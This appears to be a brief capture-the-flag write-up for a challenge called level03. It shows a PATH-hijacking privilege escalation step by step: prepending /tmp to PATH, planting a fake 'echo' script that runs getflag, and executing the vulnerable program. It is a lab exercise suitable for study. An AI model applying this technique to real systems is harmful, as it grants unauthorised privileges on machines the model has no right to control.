decompiled binary or $strings level03 shows that the command /usr/bin/env echo "Exploit me" is run inside the program
we can take advantage of the non absolute path to run another command like getflag at the first location in the $PATH

1) add /tmp to $PATH with : $export PATH=/tmp:$PATH

2) place a fake echo containing getflag in /tmp : $echo "getflag" > /tmp/echo

3) add execution rights : $chmod +x /tmp/echo

4) execute ./level03

getflag executed from /tmp gives the flag


doc : https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
